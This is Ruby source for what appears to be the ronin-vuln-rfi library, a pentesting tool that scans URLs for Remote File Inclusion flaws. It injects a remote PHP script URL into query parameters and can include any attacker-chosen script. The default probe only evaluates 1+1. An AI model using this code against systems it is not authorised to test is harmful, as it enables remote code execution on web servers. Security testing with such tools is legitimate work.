#
# ronin-vuln-rfi - A small Ruby library for testing Remote File Inclusion (RFI)
# vulnerabilities.
#
# Copyright (c) 2007-2022 Hal Brodigan (postmodern.mod3 at gmail.com)
#
# ronin-vuln-rfi is free software: you can redistribute it and/or modify
# it under the terms of the GNU Lesser General Public License as published
# by the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# ronin-vuln-rfi is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public License
# along with ronin-vuln-rfi.  If not, see <https://www.gnu.org/licenses/>.
#

require 'ronin/support/network/http'

require 'uri/query_params'
require 'digest/md5'

module Ronin
  module Vuln
    class RFI

      # Default URL of the RFI Test script
      TEST_SCRIPT = 'https://raw.githubusercontent.com/ronin-rb/ronin-vuln-rfi/main/data/test.php'

      # The string that will be returned if the RFI script is executed
      VULN_RESPONSE_STRING = "Remote File Inclusion (RFI) Detected: eval(\"1 + 1\") = 2"

      # RFI vulnerable url
      attr_reader :url

      # RFI vulnerable query parameter 
      attr_reader :param

      # Whether to terminate the RFI script url with a null byte
      attr_accessor :terminate

      # URL of the RFI Test script
      attr_accessor :test_script

      #
      # Creates a new RFI object.
      #
      # @param [String, URI::HTTP] url
      #   The URL to attempt to exploit.
      #
      # @param [String, Symbol] param
      #   The query parameter to attempt RFI on.
      #
      # @param [Hash] options
      #   Additional options.
      #
      # @option options [Boolean] :terminate (true)
      #   Specifies whether to terminate the RFI script URL
      #   with a `?`.
      #
      # @option options [String, URI::HTTP] :test_script (RFI.test_script)
      #   The URL of the RFI test script.
      #
      def initialize(url,param,options={})
        @url   = url
        @param = param

        if options.has_key?(:terminate)
          @terminate = options[:terminate]
        else
          @terminate = true
        end

        @test_script = (options[:test_script] || self.test_script)
      end

      #
      # Specifies the URL to the RFI testing script.
      #
      # @return [String]
      #   The URL to the RFI testing script.
      #
      # @since 0.1.4
      #
      def self.test_script
        @@ronin_rfi_test_script ||= TEST_SCRIPT
      end

      #
      # Uses a new URL for the RFI testing script.
      #
      # @param [String] new_url
      #   The new URL to the RFI testing script.
      #
      # @return [String]
      #   The new URL to the RFI testing script.
      #
      # @since 0.1.4
      #
      def self.test_script=(new_url)
        @@ronin_rfi_test_script = new_url
      end

      #
      # Scans the URL for RFI vulnerabilities.
      #
      # @param [URI::HTTP, String] url
      #   The URL to scan.
      #
      # @param [Hash] options
      #   Additional options.
      #
      # @yield [rfi]
      #   The given block will be passed each discovered RFI vulnerability.
      #
      # @yieldparam [RFI] rfi
      #   A discovered RFI vulnerability.
      #
      # @return [Enumerator]
      #   If no block is given, an enumerator object will be returned.
      #
      # @since 0.2.0
      #
      def self.scan(url,options={})
        return enum_for(:scan,url,options) unless block_given?

        url = URI(url)

        url.query_params.each_key do |param|
          rfi = self.new(url,param)

          yield rfi if rfi.vulnerable?(options)
        end
      end

      #
      # @return [Boolean]
      #   Specifies whether the RFI script URL will be terminated with
      #   a `?`.
      #
      def terminate?
        @terminate == true
      end

      #
      # Builds a RFI URL.
      #
      # @param [String, URI::HTTP] script_url
      #   The URL of the PHP script to include remotely.
      #
      # @return [URI::HTTP]
      #   The URL to use to trigger the RFI.
      #
      def url_for(script_url)
        script_url = URI(script_url)
        new_url    = URI(@url)

        new_url.query_params.merge!(script_url.query_params)
        script_url.query_params.clear

        script_url = "#{script_url}?" if terminate?

        new_url.query_params[@param.to_s] = script_url
        return new_url
      end

      #
      # Performs a Remote File Inclusion.
      #
      # @param [String, URI::HTTP] script
      #   The URL of the PHP script to include remotely.
      #
      # @param [Hash] options
      #   Additional HTTP options.
      #
      # @option options [Symbol] :method (:get)
      #   The HTTP method to perform the Remote File Inclusion.
      #   Maybe be either `:get` or `:post`.
      #
      # @return [String]
      #   The body of the response from the RFI.
      #
      # @see Net.http_post_body
      # @see Net.http_get_body
      #
      def include(script,options={})
        options  = options.merge(:url => url_for(script))
        response = Net.http_request(options)

        return response.body
      end

      #
      # Tests whether the URL and query parameter are vulnerable to RFI.
      #
      # @return [Boolean]
      #   Specifies whether the URL and query parameter are vulnerable
      #   to RFI.
      #
      def vulnerable?(options={})
        response = include(@test_script,options)

        return response.include?(VULN_RESPONSE_STRING)
      end

    end
  end
end
